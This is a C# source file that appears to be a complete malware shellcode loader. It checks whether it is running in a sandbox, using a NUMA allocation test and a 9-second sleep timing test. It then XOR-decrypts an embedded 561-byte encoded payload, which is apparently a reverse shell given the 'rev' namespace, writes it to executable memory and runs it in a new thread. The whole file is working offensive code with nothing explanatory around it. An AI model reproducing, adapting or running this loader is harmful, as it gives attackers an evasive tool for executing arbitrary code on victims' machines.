using System.Runtime.InteropServices;
using System;
using System.Text;

namespace rev
{
    public class Program
    {
        public const uint EXECUTEREADWRITE = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        public static void Main()
        {

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
            DateTime t1 = DateTime.Now;
            Sleep(9000);
            double dT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (dT < 8.5)
            {
                return;
            }

            byte[] b_ = new byte[561] { 0x40, 0x9c, 0xa7, 0xf8, 0xe4, 0x4c, 0x98, 0x47, 0x52, 0xde, 0x46, 0xab, 0xf2, 0xe8, 0xa2, 0x21, 0xbd, 0xcc, 0xac, 0xf3, 0x03, 0x6c, 0xf3, 0x03, 0x6d, 0xdd, 0x7d, 0x94, 0x58, 0xda, 0xdf, 0xbc, 0x7c, 0x95, 0x88, 0x89, 0x41, 0x50, 0x1a, 0x54, 0x5a, 0x14, 0x7f, 0x44, 0x03, 0x54, 0xa8, 0xcf, 0x44, 0xe0, 0x6c, 0x5c, 0x58, 0x07, 0x74, 0xa8, 0xef, 0xb8, 0xe9, 0xbe, 0xf9, 0xf8, 0xbd, 0xf0, 0x99, 0x3d, 0xdd, 0xe0, 0x64, 0xea, 0xc8, 0xbe, 0xee, 0xe0, 0x64, 0xea, 0xb0, 0xa7, 0x33, 0xfa, 0xcf, 0xf0, 0xa7, 0x58, 0xf2, 0xe2, 0xa7, 0x33, 0xda, 0xbf, 0xf5, 0x99, 0x26, 0xf0, 0x99, 0x2f, 0x14, 0x94, 0x8e, 0xc4, 0xaa, 0xc3, 0x98, 0xe9, 0x2e, 0x71, 0xa5, 0xae, 0xb9, 0x69, 0x0d, 0x55, 0xfa, 0xae, 0xe9, 0xe0, 0x64, 0xea, 0x88, 0x64, 0xfa, 0x94, 0xa7, 0xb9, 0x78, 0x89, 0x39, 0xd0, 0xf7, 0xb3, 0xaa, 0xe0, 0x3d, 0xda, 0xef, 0xb8, 0xa8, 0x64, 0x38, 0x20, 0xef, 0xb8, 0xa8, 0xa7, 0x3d, 0x68, 0x9b, 0xdf, 0xe0, 0xee, 0x68, 0xec, 0x64, 0xf8, 0x88, 0xa6, 0xb9, 0x78, 0xbf, 0x33, 0xe0, 0xf7, 0x5b, 0xfe, 0xa7, 0x47, 0x61, 0xa2, 0x89, 0x61, 0xae, 0x33, 0x9c, 0x67, 0xf0, 0xa9, 0x39, 0xf0, 0x99, 0x2f, 0xf9, 0x69, 0x26, 0xb5, 0x04, 0xae, 0xb9, 0x69, 0xd7, 0x58, 0xdd, 0x1e, 0xf4, 0xab, 0xa3, 0x9c, 0xa0, 0xaa, 0x81, 0x79, 0x9a, 0x60, 0xf0, 0xab, 0x33, 0xe8, 0xcb, 0xf1, 0xa9, 0x3f, 0xde, 0xe9, 0x64, 0xb4, 0xe0, 0xab, 0x33, 0xe8, 0xf3, 0xf1, 0xa9, 0x3f, 0xf9, 0x23, 0xeb, 0x30, 0xe0, 0xee, 0x68, 0xe9, 0xb7, 0xf9, 0xf0, 0xb1, 0xe1, 0xf2, 0xae, 0xe0, 0xe9, 0xb6, 0xf9, 0xf2, 0xa7, 0x3b, 0x44, 0xcf, 0xf9, 0xfa, 0x10, 0x58, 0xf0, 0xae, 0xe1, 0xf2, 0xa7, 0x33, 0xba, 0x06, 0xf3, 0x57, 0x10, 0x47, 0xf5, 0xa6, 0x06, 0xdf, 0x9c, 0x8a, 0xf7, 0xdc, 0x8a, 0xa8, 0xef, 0xf9, 0xfe, 0xa6, 0x31, 0x4e, 0xa7, 0x39, 0x44, 0x4f, 0xb9, 0xa8, 0xef, 0xf1, 0x21, 0x0a, 0xf1, 0x14, 0xed, 0xb8, 0xa9, 0x54, 0x78, 0x00, 0xc2, 0x59, 0xe9, 0xbb, 0xf1, 0x21, 0x0b, 0xf4, 0x21, 0x1e, 0xf9, 0x12, 0xa3, 0xcf, 0x8e, 0xe8, 0x47, 0x7d, 0xa3, 0x31, 0x42, 0x87, 0xb9, 0xa9, 0xef, 0xb8, 0xf1, 0xae, 0x02, 0x81, 0x6f, 0xd3, 0xa8, 0x10, 0x6d, 0xc2, 0xe5, 0xf9, 0xf6, 0xbf, 0xe8, 0xe5, 0xde, 0x71, 0xe5, 0xde, 0x78, 0xe0, 0x10, 0x78, 0xe0, 0x66, 0x7a, 0xe0, 0x10, 0x78, 0xe0, 0x66, 0x79, 0xe9, 0x55, 0x52, 0xa7, 0x30, 0x58, 0x57, 0x3a, 0xf0, 0x21, 0x28, 0xd2, 0xb8, 0xae, 0xe0, 0xe4, 0x66, 0x5a, 0xe0, 0x66, 0x41, 0xe9, 0x55, 0x21, 0x0d, 0x9b, 0xd9, 0x57, 0x3a, 0x3d, 0x68, 0x9b, 0xb2, 0xe1, 0x10, 0x76, 0xdd, 0x0a, 0x50, 0x3b, 0xef, 0xb8, 0xa8, 0xa7, 0x3b, 0x44, 0xff, 0xf0, 0x21, 0x0d, 0xf5, 0x99, 0x26, 0xd2, 0xac, 0xae, 0xe0, 0xe0, 0x66, 0x41, 0xe9, 0x55, 0xba, 0x71, 0x27, 0xe7, 0x57, 0x3a, 0x3b, 0x50, 0xef, 0xc6, 0xfd, 0xa7, 0x3b, 0x6c, 0xcf, 0xe6, 0x21, 0x19, 0xd2, 0xe8, 0xae, 0xe1, 0xc0, 0xef, 0xa8, 0xa8, 0xef, 0xf9, 0xf0, 0xa7, 0x31, 0x5a, 0xa7, 0x89, 0x61, 0xae, 0x02, 0xf0, 0x4b, 0xeb, 0x4d, 0x10, 0x6d, 0xe0, 0x66, 0x7b, 0xe1, 0x66, 0x7f, 0xe5, 0xde, 0x71, 0xe1, 0x66, 0x48, 0xe0, 0x66, 0x62, 0xe0, 0x66, 0x41, 0xe9, 0x55, 0xba, 0x71, 0x27, 0xe7, 0x57, 0x3a, 0x3b, 0x50, 0xef, 0xc5, 0x80, 0xb7, 0xf9, 0xff, 0xb6, 0xd0, 0xa8, 0xaf, 0xb8, 0xa8, 0xae, 0xe0, 0xc2, 0xef, 0xe2, 0xe9, 0x55, 0xb3, 0x87, 0xe0, 0x88, 0x57, 0x3a, 0xef, 0xf1, 0xae, 0x02, 0xdd, 0x81, 0xf5, 0xc9, 0x10, 0x6d, 0xe1, 0x10, 0x76, 0x41, 0xd3, 0x47, 0x57, 0x10, 0xf0, 0xa9, 0x2c, 0xf0, 0x81, 0x29, 0xf0, 0x2d, 0x19, 0xcd, 0x1c, 0xae, 0x47, 0x4f, 0xb7, 0xd2, 0xa8, 0xb6, 0x03, 0x48, 0xf2, 0x92, 0xa2, 0xae, 0x31, 0x72, 0x10, 0x6d, 0x58, 0xda };
            int pSize_ = b_.Length;

            byte[] k_ = new byte[] { 0xAB, 0xBB, 0xFC };

            for (int i = 0; i < b_.Length; i++)
            {
                b_[i] ^= k_[i % 3];
            }
            IntPtr paddr_ = VirtualAlloc(IntPtr.Zero, pSize_, COMMIT_RESERVE, EXECUTEREADWRITE);
            Marshal.Copy(b_, 0, paddr_, pSize_);
            IntPtr t_ = CreateThread(IntPtr.Zero, 0, paddr_, IntPtr.Zero, 0, 0);
            int waitR = WaitForSingleObject(t_, -1);
        }
    }
}